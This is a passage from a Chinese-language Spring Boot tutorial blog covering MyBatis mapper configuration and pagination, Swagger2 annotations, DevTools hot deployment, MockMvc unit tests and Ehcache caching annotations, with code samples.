class="string">com.mchange.v2.c3p0.ComboPooledDataSource</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/DBName?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=GMT%2B8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mybatis 配置</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:/mappers/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.xxxk.springframework.po</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment">## 下划线转驼峰配置</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pagehelper</span></span><br><span class="line"><span class="attr">pagehelper:</span></span><br><span class="line">  <span class="attr">helper-dialect:</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure><p>Mybatis通过XML文件配置与接口的映射执行sql语句，在<code>resources/mappers</code>目录下添加xml配置，<code>id</code>属性与接口方法名对应</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.xxxx.springboot.dao.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByUserName&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    select</span><br><span class="line">    id,user_name,user_pwd</span><br><span class="line">    from tb_user</span><br><span class="line">    where user_name=#&#123;userName&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">queryUserByUserName</span><span class="params">(String userName)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Service层注入接口调用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">queryUserByUserName</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.queryUserByUserName(userName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的启动类需要<code>@MapperScan</code>扫描指定包中创建的接口</p><p>对于分页查询，将查询的参数封装在一个类中，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserQuery</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectByParams</span><span class="params">(UserQuery userQuery)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置XML映射</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.xxxx.springboot.dao.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;selectByParams&quot;</span> parameterType=<span class="string">&quot;com.xxxx.springboot.query.UserQuery&quot;</span></span><br><span class="line">    resultType=<span class="string">&quot;com.xxxx.springboot.po.User&quot;</span>&gt;</span><br><span class="line">    select</span><br><span class="line">    *</span><br><span class="line">    from</span><br><span class="line">    tb_user</span><br><span class="line">    &lt;where&gt;</span><br><span class="line">    &lt;<span class="keyword">if</span> test=<span class="string">&quot;null != userName and userName !=&#x27;&#x27;&quot;</span>&gt;</span><br><span class="line">    and user_name like <span class="title function_">concat</span><span class="params">(<span class="string">&#x27;%&#x27;</span>,#&#123;userName&#125;, <span class="string">&#x27;%&#x27;</span>)</span></span><br><span class="line">    &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">    &lt;/where&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure><p>Service层进行对应实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> PageInfo&lt;User&gt; <span class="title function_">queryUserByParams</span><span class="params">(UserQuery userQuery)</span>&#123;</span><br><span class="line">        PageHelper.startPage(userQuery.getPageNum(), userQuery.getPageSize());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;User&gt;(userMapper.selectByParams(userQuery));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Swagger2文档构建"><a href="#Swagger2文档构建" class="headerlink" title="Swagger2文档构建"></a>Swagger2文档构建</h2><p>在 Spring Boot 多终端项目中，通常使用一套 API 接口为不同终端提供服务。为方便联调测试，后端需提供接口文档，可通过 Swagger2 自动生成，免去手动编写文档的繁琐</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>配置依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>添加配置类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Swagger2</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">            .apiInfo(apiInfo())</span><br><span class="line">            .select()</span><br><span class="line">            .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.xxxx.springboot.controller&quot;</span>))</span><br><span class="line">            .paths(PathSelectors.any())</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">            .title(<span class="string">&quot;用户管理接口API文档&quot;</span>)</span><br><span class="line">            .version(<span class="string">&quot;1.0&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h3><p><strong><code>@Api</code></strong></p><p>用在请求的类上，具有<code>tag</code>属性，说明该类的作用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Api(tags=&quot;APP用户注册Controller&quot;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiOperation</code></strong></p><p>用在请求的方法上，说明方法的作用，<code>value</code>属性说明方法的作用，<code>notes</code>属性为方法的备注说明</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value=&quot;用户注册&quot;, notes=&quot;手机号、密码都是必填项，年龄是选填项，但必须是数字&quot;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiImplicitParams</code></strong></p><p>用在请求的方法上，包含一组参数说明，<code>@ApiImplicitParam</code>用在 <code>@ApiImplicitParams</code> 注解中，指定一个请求参数的配置信息</p><table><thead><tr><th align="left">属性名</th><th align="left">说明</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left"><strong>name</strong></td><td align="left">参数名</td><td align="left"><code>&quot;userId&quot;</code></td></tr><tr><td align="left"><strong>value</strong></td><td align="left">参数的汉字说明、解释</td><td align="left"><code>&quot;用户ID&quot;</code></td></tr><tr><td align="left"><strong>required</strong></td><td align="left">参数是否必须传</td><td align="left"><code>true</code> &#x2F; <code>false</code></td></tr><tr><td align="left"><strong>paramType</strong></td><td align="left">参数放在哪个地方</td><td align="left"><code>&quot;header&quot;</code> &#x2F; <code>&quot;query&quot;</code> &#x2F; <code>&quot;path&quot;</code> &#x2F; <code>&quot;body&quot;</code> &#x2F; <code>&quot;form&quot;</code></td></tr><tr><td align="left"><strong>对应注解</strong></td><td align="left">请求参数获取方式</td><td align="left"><code>@RequestHeader</code> &#x2F; <code>@RequestParam</code> &#x2F; <code>@PathVariable</code></td></tr><tr><td align="left"><strong>datatype</strong></td><td align="left">参数类型，默认为String</td><td align="left"><code>&quot;Integer&quot;</code> &#x2F; <code>&quot;String&quot;</code> &#x2F; <code>&quot;Boolean&quot;</code></td></tr><tr><td align="left"><strong>defaultValue</strong></td><td align="left">参数的默认值</td><td align="left"><code>&quot;0&quot;</code> &#x2F; <code>&quot;default&quot;</code></td></tr></tbody></table><p><code>paramType</code> 对应关系</p><table><thead><tr><th align="left">paramType 值</th><th align="left">对应注解</th><th align="left">使用场景</th></tr></thead><tbody><tr><td align="left"><code>header</code></td><td align="left"><code>@RequestHeader</code></td><td align="left">从请求头获取参数</td></tr><tr><td align="left"><code>query</code></td><td align="left"><code>@RequestParam</code></td><td align="left">从URL查询参数获取</td></tr><tr><td align="left"><code>path</code></td><td align="left"><code>@PathVariable</code></td><td align="left">从URL路径获取（RESTful接口）</td></tr><tr><td align="left"><code>body</code></td><td align="left"><code>@RequestBody</code></td><td align="left">从请求体获取（不常用）</td></tr><tr><td align="left"><code>form</code></td><td align="left">-</td><td align="left">表单提交（不常用）</td></tr></tbody></table><p>示例如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;mobile&quot;, value=&quot;手机号&quot;, required=true, paramType=&quot;form&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;password&quot;, value=&quot;密码&quot;, required=true, paramType=&quot;form&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name=&quot;age&quot;, value=&quot;年龄&quot;, required=true, paramType=&quot;form&quot;, dataType=&quot;Integer&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiResponses</code></strong></p><p>用于请求的方法上，表示一组响应，<code>@ApiResponse</code>用在 <code>@ApiResponses</code> 中，一般用于表达一个错误的响应信息</p><table><thead><tr><th align="left">属性名</th><th align="left">说明</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left"><strong>code</strong></td><td align="left">HTTP 状态码</td><td align="left"><code>400</code>, <code>404</code>, <code>500</code></td></tr><tr><td align="left"><strong>message</strong></td><td align="left">响应信息描述</td><td align="left"><code>&quot;请求参数没填好&quot;</code>, <code>&quot;用户不存在&quot;</code></td></tr><tr><td align="left"><strong>response</strong></td><td align="left">抛出的异常类（可选）</td><td align="left"><code>IllegalArgumentException.class</code>, <code>UserNotFoundException.class</code></td></tr></tbody></table><p>示例如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;select请求&quot;, notes = &quot;多个参数，多种的查询参数类型&quot;)</span></span><br><span class="line"><span class="meta">@ApiResponses(&#123;</span></span><br><span class="line"><span class="meta">    @ApiResponse(code = 400, message = &quot;请求参数没填好&quot;),</span></span><br><span class="line"><span class="meta">    @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p><strong><code>@ApiModel</code></strong></p><p>用于响应类上，表示一个返回响应数据的信息（这种一般用在post创建的时候，使用<code>@RequestBody</code>这样的场景，请求参数无法使用<code>@ApiImplicitParam</code>注解进行描述的时候），<code>@ApiModelProperty</code>用在属性上，描述响应类的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModel(description = &quot;返回响应数据&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestMessage</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;是否成功&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;返回对象&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Object data;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;错误编号&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer errCode;</span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;错误信息&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动项目，访问项目页面<code>/swagger_ui.html</code>即可查看接口文档，例如<code>http://localhost:8080/swagger_ui.htm</code>l</p><br/><h2 id="应用热部署"><a href="#应用热部署" class="headerlink" title="应用热部署"></a>应用热部署</h2><p>热部署是指在不重启应用的情况下，实时更新代码、修复缺陷或增加功能，使修改立即生效</p><h3 id="配置与使用"><a href="#配置与使用" class="headerlink" title="配置与使用"></a>配置与使用</h3><p>添加<code>DevTools</code>依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- DevTools 的依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--当前这个项目被继承之后，这个不向下传递--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时在 plugin 中添加 devtools 生效标志</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span><span class="comment">&lt;!-- 如果没有该配置，热部署的devtools不生效 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>全局文件配配置，将 <code>spring.devtools.restart.enabled</code> 设为 <code>false</code>，则重启功能会被禁用，但类加载器仍然会初始化</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment">## 热部署配置</span></span><br><span class="line">  <span class="attr">devtools:</span></span><br><span class="line">    <span class="attr">restart:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># 设置重启的目录，添加目录的文件需要 restart</span></span><br><span class="line">      <span class="attr">additional-paths:</span> <span class="string">src/main/java</span></span><br><span class="line">      <span class="comment"># 解决项目自动重新编译后接口报404的问题</span></span><br><span class="line">      <span class="attr">poll-interval:</span> <span class="number">3000</span></span><br><span class="line">      <span class="attr">quiet-period:</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure><p>IDEA配置自动编译，File-&gt;Strrings-&gt;Compiler-&gt;Build Project automatically</p><p>Help -&gt; ind Action -&gt;搜索Registry-&gt;勾选<code>compiler.automake.allow.when.app.running</code></p><br/><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>做过 web 项目开发的对于单元测试都不陌生。SpringBoot 框架对单元测试也提供了良好的支持，可以快速、恰当地测试业务代码功能</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>添加依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Service业务方法测试"><a href="#Service业务方法测试" class="headerlink" title="Service业务方法测试"></a>Service业务方法测试</h3><p>使用@Runwith注解指定特定的类进行单元测试，在Spring环境下的单元测试使用<code>SpringRunner.class</code>，使用<code>@SpringBootTest</code>注解指定入口类，通常是 <code>@SpringBootApplication</code> 注解的主类</p><p>使用<code>@Before</code>注解设定在测试方法执行前的行为，<code>@After</code>注解设定在测试方法执行后的行为，<code>@Test</code>注解标记要测试的方法</p><h3 id="控制层接口方法测试"><a href="#控制层接口方法测试" class="headerlink" title="控制层接口方法测试"></a>控制层接口方法测试</h3><p>视图层代码使用 MockMvc 进行测试，其实现了对http请求的模拟，不需依赖网路环境，使用<code>@AutoConfigureMvc</code>注解进行使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = &#123;Starter.class&#125;)</span></span><br><span class="line"><span class="meta">@AutoConfigureMockMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUserController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(TestUserController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apiTest01</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MockHttpServletRequestBuilder</span> <span class="variable">request</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/user/list&quot;</span>)</span><br><span class="line">                .contentType(<span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">                .accept(MediaType.APPLICATION_JSON);</span><br><span class="line"></span><br><span class="line">        <span class="type">ResultActions</span> <span class="variable">perform</span> <span class="operator">=</span> mockMvc.perform(request);</span><br><span class="line"></span><br><span class="line">        perform.andExpect(MockMvcResultMatchers.status().isOk());</span><br><span class="line"></span><br><span class="line">        <span class="type">MvcResult</span> <span class="variable">mvcResult</span> <span class="operator">=</span> perform.andReturn();</span><br><span class="line"></span><br><span class="line">        <span class="type">MockHttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> mvcResult.getResponse();</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;响应状态: &#123;&#125;&quot;</span>, response.getStatus());</span><br><span class="line">        log.info(<span class="string">&quot;响应内容: &#123;&#125;&quot;</span>, response.getContentAsString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="分布式缓存Ehcache集成"><a href="#分布式缓存Ehcache集成" class="headerlink" title="分布式缓存Ehcache集成"></a>分布式缓存Ehcache集成</h2><p>EhCache 是一个成熟的 Java 缓存框架，最初从 Hibernate 发展而来。它是进程内缓存系统，提供了多种灵活的缓存管理方案，包括内存存储、磁盘文件存储和分布式存储方式，具有快速、简单的特点</p><h3 id="相关注解"><a href="#相关注解" class="headerlink" title="相关注解"></a>相关注解</h3><p><strong><code>@CacheConfig</code> 注解</strong></p><p>标注在类上，用于配置该类中所有缓存方法的公共属性，例如设置缓存名称</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheConfig(cacheNames = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p><strong><code>@Cacheable</code> 注解</strong></p><p>应用到读取数据的方法上，即可缓存的方法，如查找方法。它首先从缓存中读取数据，如果没有命中，再调用相应方法获取数据，然后把数据添加到缓存中</p><table><thead><tr><th align="left">参数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><strong>value</strong></td><td align="left">指定缓存存储的集合名</td></tr><tr><td align="left"><strong>cacheNames</strong></td><td align="left">value 的别名（Spring 4 新增）</td></tr><tr><td align="left"><strong>key</strong></td><td align="left">缓存对象在 Map 中的 key 值</td></tr><tr><td align="left"><strong>condition</strong></td><td align="left">缓存条件（调用前判断）</td></tr><tr><td align="left"><strong>unless</strong></td><td align="left">缓存条件（调用后判断）</td></tr><tr><td align="left"><strong>keyGenerator</strong></td><td align="left">指定自定义 key 生成器</td></tr><tr><td align="left"><strong>cacheResolver</strong></td><td align="left">指定缓存解析器</td></tr><tr><td align="left"><strong>cacheManager</strong></td><td align="left">指定缓存管理器</td></tr></tbody></table><p><strong><code>@CachePut</code> 注解</strong></p><p>应用到写数据的方法上，如新增、修改方法。调用方法时会自动把相应的数据放入缓存。<code>@CachePut</code> 的参数与 <code>@Cacheable</code> 类似</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CachePut(value = &quot;user&quot;, key = &quot;#user.id&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">save</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    users.add(user);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>@CacheEvict</code> 注解</strong></p><p>应用到移除数据的方法上，如删除方法。调用方法时会从缓存中移除相应的数据</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CacheEvict(value = &quot;user&quot;, key = &quot;#id&quot;)</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(<span class="keyword">final</span> Integer id)</span>;</span><br></pre></td></tr></table></figure><p>除了同 <code>@Cacheable</code> 一样的参数之外，<code>@CacheEvict</code> 还有下面两个参数：</p><p><code>allEntries</code>非必需，默认为 false。当为 true 时，会移除所有数据</p><p><code>beforeInvocation</code>非必需，默认为 false，会在调用方法之后移除数据。当为 true 时，会在调用方法之前移除数据</p><p><strong><code>@Caching</code>注解</strong> </p><p>用于组合多个 Cache 注解使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Caching(</span></span><br><span class="line"><span class="meta">    put = &#123;</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.id&quot;),</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.username&quot;),</span></span><br><span class="line"><span class="meta">        @CachePut(value = &quot;user&quot;, key = &quot;#user.age&quot;)</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>添加依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Ehcache --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sf.ehcache<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>resources</code>目录下新建<code>ehcache.xml</code>，用于相关配置</p><p>进行全局配置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment">## Ehcache缓存配置</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">ehcache:</span></span><br><span class="line">      <span class="attr">config:</span> <span class="string">classpath:ehcache.xml</span></span><br></pre></td></tr></table></figure><p>启动类启用缓存，添加<code>@EnableCaching</code>注解</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span 